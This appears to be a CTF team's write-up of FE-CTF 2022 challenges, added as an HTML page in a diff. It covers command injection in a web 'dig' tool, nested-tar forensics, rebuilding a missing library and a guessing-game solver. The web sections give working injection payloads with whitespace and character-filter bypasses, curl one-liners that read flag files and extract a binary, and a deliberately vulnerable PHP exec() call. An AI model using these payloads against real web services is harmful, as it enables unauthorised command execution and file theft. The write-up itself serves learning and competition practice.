@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 2022-10-31 Mon 22:34 -->
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>FE-CTF: CyberDemon</title>
+<meta name="author" content="Main user for my machines" />
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" type="text/css" href="static/style.css" />
+<script>
+// @license magnet:?xt=urn:btih:1f739d935676111cfff4b4693e3816e664797050&amp;dn=gpl-3.0.txt GPL-v3-or-Later
+     function CodeHighlightOn(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(null != target) {
+         elem.classList.add("code-highlighted");
+         target.classList.add("code-highlighted");
+       }
+     }
+     function CodeHighlightOff(elem, id)
+     {
+       var target = document.getElementById(id);
+       if(null != target) {
+         elem.classList.remove("code-highlighted");
+         target.classList.remove("code-highlighted");
+       }
+     }
+// @license-end
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        displayAlign: "center",
+        displayIndent: "0em",
+
+        "HTML-CSS": { scale: 100,
+                        linebreaks: { automatic: "false" },
+                        webFont: "TeX"
+                       },
+        SVG: {scale: 100,
+              linebreaks: { automatic: "false" },
+              font: "TeX"},
+        NativeMML: {scale: 100},
+        TeX: { equationNumbers: {autoNumber: "AMS"},
+               MultLineWidth: "85%",
+               TagSide: "right",
+               TagIndent: ".8em"
+             }
+});
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS_HTML"></script>
+</head>
+<body>
+<div id="preamble" class="status">
+<div class="header">
+    <a href="index.html">Home</a>
+    <a href="https://github.com/c3lphie">Github</a>
+</div>
+</div>
+<div id="content" class="content">
+<header>
+<h1 class="title">FE-CTF: CyberDemon</h1>
+</header><nav id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org2ac1308">1. Introduction</a></li>
+<li><a href="#org31f5537">2. Dig-host-1&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></a></li>
+<li><a href="#org98f3968">3. Dig-host-2&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></a></li>
+<li><a href="#org8909e2e">4. Dig-host-3&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></a>
+<ul>
+<li><a href="#orged78e4a">4.1. Bonus flag&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span>&#xa0;<span class="rev">rev</span></span></a></li>
+</ul>
+</li>
+<li><a href="#org7b9bcaf">5. Tar and feathers&#xa0;&#xa0;&#xa0;<span class="tag"><span class="forensics">forensics</span></span></a></li>
+<li><a href="#org65e6677">6. Libnotfound&#xa0;&#xa0;&#xa0;<span class="tag"><span class="rev">rev</span></span></a></li>
+<li><a href="#org56d7b6d">7. Guessing Game&#xa0;&#xa0;&#xa0;<span class="tag"><span class="omgacm">omgacm</span></span></a></li>
+</ul>
+</div>
+</nav>
+
+<div id="outline-container-org2ac1308" class="outline-2">
+<h2 id="org2ac1308"><span class="section-number-2">1.</span> Introduction</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+Welcome to this write-up for the challenges that my team and I solved during FE-CTF!<br>
+This CTF had some really nice and hard challenges, and was really pwn and rev heavy, but there was a couple of other challenges for those not into pwn or rev.<br>
+</p>
+
+<p>
+This CTF was limited to a team size of 5, so me and some other admins in <a href="https://jutlandia.club">Jutlandia</a> decided to give it a shot.<br>
+We had the team name <code>0x6a75746c616e646961646d696e73</code>, which in ascii is:<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-bash">echo 6a75746c616e646961646d696e73 |  xxd -r -p
+</pre>
+</div>
+
+<pre class="example">
+jutlandiadmins
+</pre>
+
+
+<p>
+When the CTF finished we placed 17th.<br>
+</p>
+</div>
+</div>
+
+<div id="outline-container-org31f5537" class="outline-2">
+<h2 id="org31f5537"><span class="section-number-2">2.</span> Dig-host-1&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></h2>
+<div class="outline-text-2" id="text-2">
+<p>
+This challenge was the first of four in total.<br>
+In this challenge we were presented with simple website, where we can run dig on hosts.<br>
+<img src="assets/2022-10-30_16-30-34_screenshot.png" alt="2022-10-30_16-30-34_screenshot.png"><br>
+</p>
+
+<p>
+As you can see below we get the standard output from <code>dig</code> when we enter an IP-address or host in the field.<br>
+<img src="assets/2022-10-30_16-31-40_screenshot.png" alt="2022-10-30_16-31-40_screenshot.png"><br>
+</p>
+
+<p>
+This looks very vulnerable to what is called command injection.<br>
+As the name implies it is the act of injecting command that will then be run on the target server.<br>
+</p>
+
+<p>
+We tested this by injecting the command <code>echo test</code> like so:<br>
+<img src="assets/2022-10-30_16-52-37_screenshot.png" alt="2022-10-30_16-52-37_screenshot.png"><br>
+We can get the flag by using the following oneliner:<br>
+</p>
+<pre class="example" id="org7af8619">
+[c3lphie@laptop:~]$ curl 'http://dig-host-1-web.hack.fe-ctf.dk/html/dig_host_level1.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0'  --data-raw 'host=%3B+cat+%2Fflag' | grep flag | cut -d "&lt;" -f 1
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+100  1945    0  1925  100    20   8813     91 --:--:-- --:--:-- --:--:--  8922
+
+;; flags: qr rd ra; QUERY: 1, ANSWER: 13, AUTHORITY: 0, ADDITIONAL: 1
+; EDNS: version: 0, flags:; udp: 512
+flag{do people still use php?}
+</pre>
+<p>
+And there it is:<br>
+<code>flag{do people still use php?}</code><br>
+</p>
+</div>
+</div>
+<div id="outline-container-org98f3968" class="outline-2">
+<h2 id="org98f3968"><span class="section-number-2">3.</span> Dig-host-2&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></h2>
+<div class="outline-text-2" id="text-3">
+<p>
+This is the second part of in this collection of challenges.<br>
+There is a small hurdle in this challenge, as whitespace is removed.<br>
+But we can bypass this using the <code>${IFS}</code> environment variable instead of a space character.<br>
+IFS is short for Internal Field Seperator, and is what bash uses to seperate commands.<br>
+So we changed our payload to:<br>
+</p>
+<pre class="example">
+;cat${IFS}/flag
+</pre>
+
+<p>
+Then we can just use the following oneliner to get the flag:<br>
+</p>
+<pre class="example" id="org7b835a1">
+[c3lphie@laptop:~]$ curl -X POST 'http://dig-host-2-web.hack.fe-ctf.dk/html/dig_host_level2.php' --data 'host=;cat${IFS}/flag'| grep flag | cut -d "&lt;" -f 1
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+100  1960    0  1940  100    20   5797     59 --:--:-- --:--:-- --:--:--  5868
+
+;; flags: qr rd ra; QUERY: 1, ANSWER: 13, AUTHORITY: 0, ADDITIONAL: 1
+; EDNS: version: 0, flags:; udp: 512
+flag{who needs to sanitize input anyway?}
+</pre>
+<p>
+And there is the second flag:<br>
+<code>flag{who needs to sanitize input anyway?}</code><br>
+</p>
+</div>
+</div>
+<div id="outline-container-org8909e2e" class="outline-2">
+<h2 id="org8909e2e"><span class="section-number-2">4.</span> Dig-host-3&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span></span></h2>
+<div class="outline-text-2" id="text-4">
+<p>
+This was the second last part of the dig-host challenges.<br>
+The vulnerability was the same but now <code>$</code> was an illegal character.<br>
+This could be circumvented using bash redirections.<br>
+Giving us a final payload of:<br>
+</p>
+<pre class="example">
+;cat&lt;./flag
+</pre>
+
+<pre class="example" id="org0e49976">
+[nix-shell:~]$ curl -X POST 'http://dig-host-3-web.hack.fe-ctf.dk/html/dig_host_level3.php' --data-raw "host=;cat&lt;./flag"|grep flag | cut -d "&lt;" -f 1 | recode html..ascii
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   980    0   964  100    16   3374     56 --:--:-- --:--:-- --:--:--  3438
+
+flag{it's not bug, it's a feature}
+</pre>
+<p>
+There we got the flag:<br>
+<code>flag{it's not bug, it's a feature}</code><br>
+</p>
+</div>
+<div id="outline-container-orged78e4a" class="outline-3">
+<h3 id="orged78e4a"><span class="section-number-3">4.1.</span> Bonus flag&#xa0;&#xa0;&#xa0;<span class="tag"><span class="web">web</span>&#xa0;<span class="rev">rev</span></span></h3>
+<div class="outline-text-3" id="text-4-1">
+<p>
+The third dig-host challenge had a bonus flag. But it wasn't readable by normal means.<br>
+If we look at the content of directory we can see a couple of things:<br>
+<img src="assets/2022-10-30_19-31-15_screenshot.png" alt="2022-10-30_19-31-15_screenshot.png"><br>
+There is a bonus flag, but if we try and read it, we won't get any output.<br>
+This is most likely due to permissions.<br>
+</p>
+
+<p>
+There are two files of interest though, the <code>dig</code> file and <code>dig_host_level3.php</code>.<br>
+</p>
+
+<p>
+Content of <code>dig_host_level3.php</code>:<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-php">&lt;?php
+	require_once("../include/smarty.php");
+
+
+	$host = "";
+	$output = "";
+
+	if(isset($_POST) &amp;&amp; is_array($_POST) &amp;&amp; array_key_exists("host", $_POST)) {
+		$host = preg_replace("/[\s\$-]+/", "", $_POST["host"]);
+
+		exec("/dig ".$host, $output);
+	}
+
+	$smarty-&gt;assign(array(
+		"PHP_SELF"      =&gt; $_SERVER["PHP_SELF"],
+		"host"          =&gt; $host,
+		"output"	=&gt; implode("\n", $output)
+	));
+
+	$smarty-&gt;display("dig_host_level3.tpl");
+?&gt;
+</pre>
+</div>
+<p>
+If you look at the <code>exec</code> call you see the original vulnerability, but the path of the <code>dig</code> binary isn't something standard like <code>/usr/bin/dig</code>.<br>
+</p>
+
+<p>
+So lets take a closer look at that!<br>
+First we can extract it using <code>base64</code> with this payload:<br>
+</p>
+<pre class="example">
+;base64&lt;/dig
+</pre>
+
+
+<p>
+With some bash kung fu we can download it using this command:<br>
+</p>
+<pre class="example">
+curl -X POST 'http://dig-host-3-web.hack.fe-ctf.dk/html/dig_host_level3.php' --data-raw "host=;base64&lt;./dig" | cut -d "&lt;" -f 1 | xargs | sed "s/ //g" | base64 -d &gt; dig_extract
+</pre>
+
+<p>
+Now that we have the binary, we can examine it further using a decompiler such as ghidra.<br>
+If we look at this snippet from the decompiled main function:<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-c">  if (param_1 == 2) {
+  local_1c = thunk_FUN_004010e6(&amp;local_1028);
+  for (local_1a = 0; uVar4 = (ulong)local_1a, uVar2 = thunk_FUN_004010e6(param_2[1]),
+      uVar4 &lt; uVar2; local_1a = local_1a + 1) {
+    if ((((*(char *)((ulong)local_1a + param_2[1]) != '\t') &amp;&amp;
+	 (*(char *)((ulong)local_1a + param_2[1]) != '\n')) &amp;&amp;
+	(*(char *)((ulong)local_1a + param_2[1]) != '\f')) &amp;&amp;
+       (((*(char *)((ulong)local_1a + param_2[1]) != '\r' &amp;&amp;
+	 (*(char *)((ulong)local_1a + param_2[1]) != ' ')) &amp;&amp;
+	((*(char *)((ulong)local_1a + param_2[1]) != '$' &amp;&amp;
+	 (*(char *)((ulong)local_1a + param_2[1]) != '&lt;')))))) {
+      *(undefined *)((long)&amp;local_1028 + (long)(int)(uint)local_1c) =
+	   *(undefined *)(param_2[1] + (ulong)local_1a);
+      local_1c = local_1c + 1;
+      if (0xffe &lt; local_1c) break;
+    }
+  }
+  *(undefined *)((long)&amp;local_1028 + (long)(int)(uint)local_1c) = 0;
+  uVar1 = FUN_0044dce0("/bin/bash",&amp;local_1048);
+}
+</pre>
+</div>
+<p>
+There is a lot of input sanitization, and after that a reference to <code>/bin/bash</code>.<br>
+Next up we can run strace on the binary and see what its syscalls:<br>
+</p>
+<pre class="example" id="org79e5b15">
+[nix-shell:~]$ strace ./dig_extract google.com
+execve("./dig_extract", ["./dig_extract", "google.com"], 0x7ffe10ee21b8 /* 122 vars */) = 0
+brk(NULL)                               = 0x1931000
+brk(0x1931c40)                          = 0x1931c40
+arch_prctl(ARCH_SET_FS, 0x1931300)      = 0
+uname({sysname="Linux", nodename="laptop", ...}) = 0
+readlink("/proc/self/exe", "/home/c3lphie/dig_extract", 4096) = 25
+brk(0x1952c40)                          = 0x1952c40
+brk(0x1953000)                          = 0x1953000
+mprotect(0x4bc000, 12288, PROT_READ)    = 0
+execve("/bin/bash", ["bash", "-pc", "dig google.com"], 0x7ffcd9a8c7d0 /* 122 vars */) = -1 ENOENT (No such file or directory)
+exit_group(-1)                          = ?
++++ exited with 255 +++
+</pre>
+<p>
+Looking at the execve call, we realised that we needed to get our payload into this call.<br>
+</p>
+
+<p>
+We tried a lot of different things, what ended up working was wrapping a payload in <code>'</code> and using back tick command substitution with the commands in <code>{}</code> to bypass the space character.<br>
+</p>
+
+<p>
+Giving us the final payload:<br>
+</p>
+<pre class="example">
+'`{cat,bonus_flag}`'
+</pre>
+
+
+<p>
+Put into the following oneliner:<br>
+</p>
+<pre class="example" id="org7342b3a">
+[nix-shell:~]$ curl -X POST 'http://dig-host-3-web.hack.fe-ctf.dk/html/dig_host_level3.php' --data-raw "host='\`{cat,bonus_flag}\`'" | grep flag | recode html..ascii | cut -d "&gt;" -f 5- | head -n 2
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+100  2560    0  2535  100    25   8817     86 --:--:-- --:--:-- --:--:-- 100  4035    0  4010  100    25  13762     85 --:--:-- --:--:-- --:--:-- 13818
+
+ flag{wait, i thought this was web!}
+</pre>
+<p>
+And there we go the bonus flag:<br>
+<code>flag{wait, i thought this was web!}</code><br>
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-org7b9bcaf" class="outline-2">
+<h2 id="org7b9bcaf"><span class="section-number-2">5.</span> Tar and feathers&#xa0;&#xa0;&#xa0;<span class="tag"><span class="forensics">forensics</span></span></h2>
+<div class="outline-text-2" id="text-5">
+<p>
+In this challenge we were given tar file containing multiple tar files nested inside.<br>
+</p>
+
+<p>
+If we start looking at the content of the contents of the tar file we'll see that it is nested tar files:<br>
+</p>
+<pre class="example" id="orgcbb0d99">
+[nix-shell:~/.../fe22/tar-and-feathers]$ tar -xvf tar-and-feathers.tgz
+72
+
+[nix-shell:~/.../fe22/tar-and-feathers]$ file 72
+72: POSIX tar archive (GNU)
+
+[nix-shell:~/.../fe22/tar-and-feathers]$ tar -xvf 72
+75
+
+[nix-shell:~/.../fe22/tar-and-feathers]$ tar -xvf 75
+6E
+
+</pre>
+<p>
+The name of those tar files looks like bytes represented in hexadecimal.<br>
+We could begin to extract it manually, but that would take a large amount of time, especially because we don't know how many bytes are stored.<br>
+</p>
+
+<p>
+So we wrote a quick bash script to automate the process:<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-bash">#! /usr/bin/env bash
+
+HEX_STR=""
+
+NESTED_TAR="$(tar -tf $1)"
+
+tar -xvf $1
+
+while [[ true ]]; do
+    HEX_STR+=$NESTED_TAR
+    NESTED_TAR="$(tar -xvf $NESTED_TAR)"
+    echo $HEX_STR &gt; data.hex
+    echo $HEX_STR
+done
+</pre>
+</div>
+<p>
+After about 5-10 minutes the file <code>data.hex</code> contains all the bytes that we extracted.<br>
+</p>
+
+<p>
+In order to turn the ascii hex bytes into actual bytes, we used cyberchef:<br>
+</p>
+<p>
+<img src="assets/2022-10-31_21-56-49_screenshot.png" alt="2022-10-31_21-56-49_screenshot.png"><br>
+And then downloaded the result.<br>
+Examining the result using file we can that it is another tar archive:<br>
+</p>
+<pre class="example" id="orgc6ebce9">
+[nix-shell:~/.../fe22/tar-and-feathers]$ file download.dat
+download.dat: POSIX tar archive (GNU)
+
+</pre>
+<p>
+So let's extract the contents of that::<br>
+</p>
+<pre class="example" id="orge9d07f8">
+[nix-shell:~/.../fe22/tar-and-feathers]$ tar -xvf download.dat
+runme.py
+offsets.py
+top.png
+
+</pre>
+
+<p>
+The file <code>runme.py</code> has the following content:<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-python">#!/usr/bin/env python3
+import os
+import sys
+import subprocess
+from offsets import offsets
+
+if len(sys.argv) != 2:
+    print(f'Usage: {sys.argv[0]} &lt;outfile&gt;', file=sys.stderr)
+    exit(-1)
+
+INIT = 'tar-and-feathers.tgz'
+
+def run(cmd):
+    return subprocess.check_output(cmd, shell=True)
+
+def unpack1(name):
+    filemagic = run(f'file {name}')
+    if b'bzip2' in filemagic:
+	run(f'mv {name} {name}.bz2')
+	run(f'bunzip2 {name}.bz2')
+	return unpack1(name)
+    return run(f'tar xfv {name}').strip().decode()
+
+def getbyte(n):
+    print(f'getbyte({n}) = ', end='', file=sys.stderr, flush=True)
+    prev = None
+    for _ in range(n + 1):
+	next = unpack1(prev or INIT)
+	if prev and prev != next:
+	    os.unlink(prev)
+	try:
+	    byte = int(next, 16)
+	except:
+	    os.unlink(next)
+	    raise
+	prev = next
+    os.unlink(next)
+    print(f'0x{byte:02x}', file=sys.stderr)
+    return byte
+
+def unpack(path):
+    data = bytes(getbyte(offset) for offset in offsets)
+    with file(path, 'wb') as fd:
+	fd.write(data)
+
+unpack(sys.argv[1])
+</pre>
+</div>
+
+<p>
+It extracts certain bytes from the first tar file by unpacking it the nested tars until it reaches an offset from the <code>offsets.py</code> file.<br>
+Saves the byte and then starts from the beginning.<br>
+I won't show the <code>offsets.py</code> file as it just contains an array of the offsets.<br>
+This takes quite some time as you might imagine.<br>
+Luckily we already have all the bytes and the offsets!<br>
+So we created this small python script to extract the bytes at our given offsets:<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-python">from offsets import offsets
+
+data = open("download.dat", "rb").read()
+
+ndata = bytes(data[offset] for offset in offsets)
+
+with open("out.bin", "wb") as f:
+    f.write(ndata)
+</pre>
+</div>
+
+<p>
+Running the script and checking the output:<br>
+</p>
+<pre class="example" id="org7768fb2">
+[nix-shell:~/.../fe22/tar-and-feathers]$ python unpack.py
+
+[nix-shell:~/.../fe22/tar-and-feathers]$ file out.bin
+out.bin: PDF document, version 1.4, 1 pages
+</pre>
+<p>
+We find a PDF!<br>
+We renamed the file from <code>out.bin</code> to <code>out.pdf</code> and could then open it in firefox:<br>
+</p>
+<p>
+<img src="assets/2022-10-31_22-11-59_screenshot.png" alt="2022-10-31_22-11-59_screenshot.png"><br>
+Aaaaand there is a black bar&#x2026;. Lucky for us that bar won't stop us from copying the text underneath!<br>
+</p>
+
+<p>
+And we have the flag:<br>
+<code>flag{it’s turtles all the way down}</code><br>
+</p>
+</div>
+</div>
+
+
+<div id="outline-container-org65e6677" class="outline-2">
+<h2 id="org65e6677"><span class="section-number-2">6.</span> Libnotfound&#xa0;&#xa0;&#xa0;<span class="tag"><span class="rev">rev</span></span></h2>
+<div class="outline-text-2" id="text-6">
+<p>
+In this challenge we were provided with a binary that was missing library file.<br>
+</p>
+
+<p>
+We can look at the needed libraries with <code>patchelf</code>:<br>
+</p>
+<pre class="example" id="orge44c46a">
+[nix-shell:~/.../fe22/libnotfound]$ patchelf --print-needed challenge
+libnotfound.so
+libc.so.6
+
+</pre>
+
+<p>
+But we have no idea what this library should do, so we started investigating the binary.<br>
+And looking closer at the main function we see a lot of asserts for functions from the library:<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-c">  iVar1 = foo_add(0x19,0x11);
+if (iVar1 != 0x2a) {
+		  /* WARNING: Subroutine does not return */
+  __assert_fail("foo_add(25, 17) == 42","main.c",0x18,"main");
+}
+iVar1 = foo_add(0x2c,0xfffffffe);
+if (iVar1 != 0x2a) {
+		  /* WARNING: Subroutine does not return */
+  __assert_fail("foo_add(44, -2) == 42","main.c",0x19,"main");
+}
+iVar1 = foo_sub(0x35,0xb);
+if (iVar1 != 0x2a) {
+		  /* WARNING: Subroutine does not return */
+  __assert_fail("foo_sub(53, 11) == 42","main.c",0x1a,"main");
+}
+iVar1 = foo_sub(0x27,0xfffffffd);
+if (iVar1 != 0x2a) {
+		  /* WARNING: Subroutine does not return */
+  __assert_fail("foo_sub(39, -3) == 42","main.c",0x1b,"main");
+}
+iVar1 = foo_mul(0x15,2);
+if (iVar1 != 0x2a) {
+		  /* WARNING: Subroutine does not return */
+  __assert_fail("foo_mul(21, 2) == 42","main.c",0x1c,"main");
+}
+iVar1 = foo_div(0x7e,3);
+if (iVar1 != 0x2a) {
+		  /* WARNING: Subroutine does not return */
+  __assert_fail("foo_div(126, 3) == 42","main.c",0x1d,"main");
+}
+iVar1 = foo_mod(0x114,0x75);
+if (iVar1 != 0x2a) {
+		  /* WARNING: Subroutine does not return */
+  __assert_fail("foo_mod(276, 117) == 42","main.c",0x1e,"main");
+}
+</pre>
+</div>
+
+<p>
+Meaning we have to implement those into our own version of the library.<br>
+This was done using the following C code:<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-c">#ifndef __libnotfound_H
+#define __libnotfound_H
+
+extern int foo_add(long a, long b) {
+  return a + b;
+}
+
+extern int foo_sub(int a, int b){
+  return a - b;
+}
+
+extern int foo_mul(int a, int b){
+  return a * b;
+}
+
+extern int foo_div(int a, int b){
+  float fa = (float) a;
+  float fb = (float) b;
+  return (int) fa/fb;
+}
+
+extern int foo_mod(int a, int b){
+  return a % b;
+}
+
+#endif
+</pre>
+</div>
+
+<p>
+We compiled this using the following two <code>gcc</code> commands:<br>
+</p>
+<pre class="example">
+gcc -c -Wall -Werror -fpic libnotfound.cA
+gcc -shared -o libnotfound.so libnotfound.o
+</pre>
+
+
+<p>
+Now that we have the compiled library we can use this <code>patchelf</code> command to use our library:<br>
+</p>
+<pre class="example">
+patchelf --replace-needed libnotfound.so ./src/libnotfound.so challenge
+</pre>
+
+
+<p>
+We can then check it like this:<br>
+</p>
+<pre class="example" id="org07d118b">
+[nix-shell:~/.../fe22/libnotfound]$ patchelf --print-needed challenge
+./src/libnotfound.so
+libc.so.6
+
+</pre>
+
+<p>
+And then get the flag by running the binary:<br>
+</p>
+<pre class="example" id="orgef3d706">
+[nix-shell:~/.../fe22/libnotfound]$ ./challenge
+flag{hello? yes, this is flag}
+</pre>
+</div>
+</div>
+<div id="outline-container-org56d7b6d" class="outline-2">
+<h2 id="org56d7b6d"><span class="section-number-2">7.</span> Guessing Game&#xa0;&#xa0;&#xa0;<span class="tag"><span class="omgacm">omgacm</span></span></h2>
+<div class="outline-text-2" id="text-7">
+<p>
+In this challenge we were basically only given a domain and port.<br>
+Connecting to it with netcat, we get the following message:<br>
+</p>
+<pre class="example" id="org63d86a1">
+[nix-shell:~/.../fe22/guess]$ nc guess.hack.fe-ctf.dk 1337
+== proof-of-work: disabled ==
+ == Welcome to Number Guess ==
+
+I'm thinking of a number between 0 and 4000000 (both inclusive); try and guess which!
+You have 99 guesses.  But! You're only allowed to guess too high 3 times.
+
+Good luck!
+
+
+Round #0
+Your guess:
+</pre>
+<p>
+Guessing a number between 0 and 4 million seems impossible, even with 99 guesses in total because we can <i>only</i> guess too high 3 times.<br>
+</p>
+
+<p>
+So we have to be a little smart about it.<br>
+We used a sort of binary search, but based on percentages.<br>
+The percentage was calculated based on the following formula:<br>
+</p>
+\begin{equation*}
+p = \dfrac{(g_{high} + 1)}{g_{low}} 
+\end{equation*}
+<p>
+Where \(g_{high}\) is the amount guesses left that can be higher than our target number. And \(g_{low}\) is the amount of guesses that can be lower than the target.<br>
+</p>
+
+<p>
+\(g_{low}\) is calculated using:<br>
+</p>
+\begin{equation*}
+g_{low} = g_{total} - g_{high}
+\end{equation*}
+
+<p>
+We calculated our guess using this:<br>
+</p>
+\begin{equation*}
+G = \lfloor(n_{max} - n_{min}) \cdot p \rfloor + n_{min}
+\end{equation*}
+<p>
+Where \(n_{min}\) is our lowest known value, and \(n_{max}\) is our highest known value.<br>
+</p>
+
+<p>
+Then after each we change \(n_{max}\) or \(n_{min}\) depending on if we are over or under the target number.<br>
+</p>
+
+<p>
+With this strategy we got pretty far, altough we didn't account for every edge cases. We did some small hacks to account for those, but we never reached 100% accuracy.<br>
+So we just kept running the script until we survived all 50 rounds.<br>
+</p>
+
+<p>
+And after many failed attempts we finally got the flag:<br>
+<img src="assets/2022-10-31_18-57-21_screenshot.png" alt="2022-10-31_18-57-21_screenshot.png"><br>
+</p>
+
+<p>
+Final solve script:<br>
+</p>
+<div class="org-src-container">
+<pre class="src src-python">from pwn import *
+import math
+
+from multiprocessing import Pool
+
+def guess(guess: int):
+    try:
+	res = io.readuntil("Your guess:")
+	io.sendline(str(guess).encode())
+	res = io.readuntil("\n")
+	return res.decode()
+    except:
+	res = io.readline()
+	return res.decode()
+
+def calc_perc(guess_left, guess_high_left):
+    return (guess_high_left + 1) / guess_left
+
+
+def strategy(_round):
+    min_max = [0, 4000000]
+    guess_left = total_guesses
+    guess_low_left = total_guesses - too_high
+    guess_high_left = too_high
+
+    while True:
+	log.info(f"============{_round}=============")
+	_range = min_max[1] - min_max[0]
+
+	try:
+	    perc = calc_perc(guess_low_left, guess_high_left)
+	    if perc != 0:
+		_guess = math.floor(_range * perc) + min_max[0]
+	    elif perc == 1:
+		_guess = min_max[0]
+	    else:
+		_guess = min_max[0] +1
+
+	    log.info(f"MIN MAX: {min_max}")
+	    log.info(f"RANGE: {_range}")
+
+	    if _range +1 &lt;= guess_left:
+		_guess = min_max[0]
+	    if guess_left &lt;= 1 and _range &gt; guess_left:
+		_guess = min_max[0]
+	except ZeroDivisionError as e:
+	    _guess = min_max[0]
+
+	log.info(f"guesses left: {guess_left}, high left: {guess_high_left}, low left: {guess_low_left}")
+	log.info(f"calculated percentage: {perc * 100}%")
+
+	log.info(f"guess: {_guess}")
+	answer = guess(_guess)
+	log.info(f"answer: {answer}")
+	if "larger" in answer:
+	    min_max[0] = _guess
+	    guess_left -= 1
+	    guess_low_left -= 1
+	elif "Round" in answer:
+	    return answer
+	elif "flag" in answer:
+	    return answer
+	elif "loose" in answer:
+	    return answer
+	else:
+	    min_max[1] = _guess
+	    guess_left -= 1
+	    guess_high_left -= 1
+
+	guess_low_left = guess_left - guess_high_left
+    return
+
+if __name__ == '__main__':
+    io = remote("guess.hack.fe-ctf.dk", 1337)
+    total_guesses = 99
+    too_high = 3
+
+    res = strategy("round 0")
+    while True:
+	res = strategy(res)
+	try:
+	    if "flag" in res or "loose" in res:
+		log.info(res)
+		break
+	except:
+	    pass
+	log.info("======================NEW ROUND=========================")
+
+    io.close()
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<div class="footer">
+    <div id="copyright">
+        <small>&copy; Copyright 2022, C3lphie</small>
+    </div>
+</div>
+</div>
+</body>
+</html>
